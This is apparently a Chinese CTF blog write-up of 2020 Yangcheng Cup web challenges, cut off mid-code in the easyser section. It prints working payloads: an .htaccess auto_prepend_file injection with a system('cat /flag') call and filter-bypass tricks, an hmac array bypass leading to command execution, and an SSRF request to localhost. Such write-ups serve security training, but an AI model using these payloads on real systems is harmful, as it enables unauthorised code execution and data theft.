<!DOCTYPE html>
<html lang="en-us">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>2020羊城杯 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/">
  <meta property="og:site_name" content="ThnPinkman’s blog">
  <meta property="og:title" content="2020羊城杯">
  <meta property="og:description" content="WEB easycon 打开就是
扫出来个index.php 然后访问
提示eval post cmd，看来是post了个cmd可以执行命令
找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
easyphp 源码
&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="2020羊城杯">
  <meta name="twitter:description" content="WEB easycon 打开就是
扫出来个index.php 然后访问
提示eval post cmd，看来是post了个cmd可以执行命令
找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
easyphp 源码
&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !">
<meta name="application-name" content="ThnPinkman&#39;s blog">
<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/0xgame2022/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "2020羊城杯",
        "inLanguage": "en-us",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF\/"
        },"genre": "posts","wordcount":  528 ,
        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
            "@type": "Organization",
            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="ThnPinkman’s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.github.io/1651835469576.jpg"
        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
        data-sizes="auto"
        alt="https://thnpkm.github.io/1651835469576.jpg"
        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="ThnPinkman’s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.github.io/1651835469576.jpg"
        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
        data-sizes="auto"
        alt="https://thnpkm.github.io/1651835469576.jpg"
        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">2020羊城杯</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;528 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#easycon">easycon</a></li>
    <li><a href="#easyphp">easyphp</a></li>
    <li><a href="#blackcat">Blackcat</a></li>
    <li><a href="#easyser">easyser</a></li>
    <li><a href="#easyphp2">Easyphp2</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="web">WEB</h1>
<h2 id="easycon">easycon</h2>
<p>打开就是</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291659001.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291659001.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291659001.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291659001.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291659001.png"
        title="image-20220929165918918" /></p>
<p>扫出来个index.php 然后访问</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209292102796.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209292102796.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209292102796.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209292102796.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209292102796.png"
        title="image-20220929210248765" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291700994.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291700994.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291700994.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291700994.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209291700994.png"
        title="image-20220929170012967" /></p>
<p>提示eval post cmd，看来是post了个cmd可以执行命令</p>
<p>找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<h2 id="easyphp">easyphp</h2>
<p>源码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    $files <span style="color:#f92672">=</span> <span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;./&#39;</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span>($files <span style="color:#66d9ef">as</span> $file) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_file</span>($file)){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;index.php&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">unlink</span>($file);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;content&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $content <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;content&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">stristr</span>($content,<span style="color:#e6db74">&#39;on&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">stristr</span>($content,<span style="color:#e6db74">&#39;html&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">stristr</span>($content,<span style="color:#e6db74">&#39;type&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">stristr</span>($content,<span style="color:#e6db74">&#39;flag&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">stristr</span>($content,<span style="color:#e6db74">&#39;upload&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">stristr</span>($content,<span style="color:#e6db74">&#39;file&#39;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hacker&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;filename&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/[^a-z\.]/&#34;</span>, $filename) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hacker&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $files <span style="color:#f92672">=</span> <span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;./&#39;</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span>($files <span style="color:#66d9ef">as</span> $file) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_file</span>($file)){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;index.php&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">unlink</span>($file);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">file_put_contents</span>($filename, $content <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Hello, world&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>也是2019的某道题，首先看提供了一个file_put_contents()</p>
<p>那就想通过file_put_contents函数来写入木马 ，那他肯定不让你写，对$filename和$content都有过滤</p>
<p>先看题目逻辑，会清除目录下除了index.php的所有文件 ，而且只有一次写的机会，因为想要第二次写的话，就会把第一次写的东西给清了</p>
<p>文件名限制了只能是[a-z]和‘.’，而且题目环境设置了只有index.php文件解析，其他php文件不解析，想到的就是写一个.htaccess文件</p>
<p>写.htaccess文件的困难主要在于过滤了file,on,type之类的,.htaccess文件的内容需要被过滤的file</p>
<p>然后$content后面还追加了个&quot;\nHello,world&quot;，这里也要注释掉</p>
<p>1，绕$content过滤</p>
<pre tabindex="0"><code>绕过stristr()的检测

利用添加 \ 的方法来换行书写，利用这种方法来处理过滤的关键字 
Fi\
Le
就是file
</code></pre><p>利用php_value auto_prepend_file .htaccess让php文件包含htaccess文件，htaccess里的代码会执行</p>
<p>所有写入的内容如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php_value</span> <span style="color:#a6e22e">auto_prepend_fil\</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">e</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">htaccess</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\ 
</span></span></span></code></pre></div><blockquote>
<p>下面来解释一下
php_value auto_prepend_file 是用来在页面底部加载文件的
这也是为什么我们要去写入#<!-- raw HTML omitted -->\ 在文件底部</p>
<p>而#应该是.hatccess文件特有的写入形式，没有的话会直接报错500</p>
<p>最后那个/是用来转意换行符的</p>
</blockquote>
<p>如果不用\转义则，写进去的效果是</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php_value</span> <span style="color:#a6e22e">auto_prepend_fil\</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">e</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">htaccess</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\ 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Hello</span>, <span style="color:#a6e22e">world</span>
</span></span></code></pre></div><p>不符合写入格式，进而无法解析</p>
<p>payload:</p>
<pre tabindex="0"><code>/?filename=.htaccess&amp;content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?php%20system(&#39;cat%20/fla&#39;.&#39;g&#39;);?&gt;\
</code></pre><h2 id="blackcat">Blackcat</h2>
<pre tabindex="0"><code>数组绕过 
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301629072.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301629072.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301629072.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301629072.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301629072.png"
        title="image-20220930162939039" /></p>
<p>下载MP3然后文本打开，最下面藏了一段php代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;Black-Cat-Sheriff&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;One-ear&#39;</span>])){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;谁！竟敢踩我一只耳的尾巴！&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$clandestine <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;clandestine&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;White-cat-monitor&#39;</span>]))
</span></span><span style="display:flex;"><span>    $clandestine <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $_POST[<span style="color:#e6db74">&#39;White-cat-monitor&#39;</span>], $clandestine);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$hh <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $_POST[<span style="color:#e6db74">&#39;One-ear&#39;</span>], $clandestine);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($hh <span style="color:#f92672">!==</span> $_POST[<span style="color:#e6db74">&#39;Black-Cat-Sheriff&#39;</span>]){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;nc&#34;</span><span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#39;One-ear&#39;</span>]);
</span></span></code></pre></div><p>1，必须传入Black-Cat-Sheriff和One-ear</p>
<p>2，getenv()函数定义：取得系统的环境变量；
3，用hash_hmac()和$clandestine生成新的$clandestine ，再用新的$clandestine生成$hh</p>
<p>我们要控制Black-Cat-Sheriff来与$hh相等，就要通过传入White-cat-monitor和One-ear预测$hh的值</p>
<p>看hash_hmac()</p>
<pre tabindex="0"><code>hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值

string hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = false ] )
参数
algo
要使用的哈希算法名称，例如：&#34;md5&#34;，&#34;sha256&#34;，&#34;haval160,4&#34; 等。 如何获取受支持的算法清单，请参见 hash_algos() 。
data
要进行哈希运算的消息。
key
使用 HMAC 生成信息摘要时所使用的密钥。

raw_output
设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串
</code></pre><blockquote>
<p>当传入的<code>$data</code>为数组时，加密得到的结果固定为<code>NULL</code>；那么第二次的hash_hmac就是可控的.</p>
</blockquote>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301718413.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301718413.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301718413.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301718413.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301718413.png"
        title="image-20220930171810384" /></p>
<p>利用这个点，生成密钥为NULL，那么第二次的哈希值$hh我们就能运行出来</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301735624.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301735624.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301735624.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301735624.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301735624.png"
        title="image-20220930173509599" /></p>
<p>很奇怪ls没列出flag的文件名，直接cat就行了</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301734990.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301734990.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301734990.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301734990.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301734990.png"
        title="image-20220930173449940" /></p>
<h2 id="easyser">easyser</h2>
<blockquote>
<p>SSRF  LFI  反序列化  死亡exit</p>
</blockquote>
<p>robots.txt</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301756370.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301756370.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301756370.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301756370.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301756370.png"
        title="image-20220930175656345" /></p>
<p>star1.php</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757844.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757844.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757844.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757844.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757844.png"
        title="image-20220930175750819" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757599.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757599.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757599.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757599.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209301757599.png"
        title="image-20220930175759575" /></p>
<p>不安全的协议http，要利用 SSRF 才能访问到 ser.php</p>
<pre tabindex="0"><code>/star1.php?path=http://127.0.0.1/ser.php
</code></pre><p>得到源码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> ) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{Trump_:&#34;fake_news!&#34;}&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GWHT</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hero;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hero</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Yasuo</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hero</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hero</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hasaki</span>();
</span></span><span style="display:flex;"><span>        }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;You don&#39;t look very happy&#34;</span>;
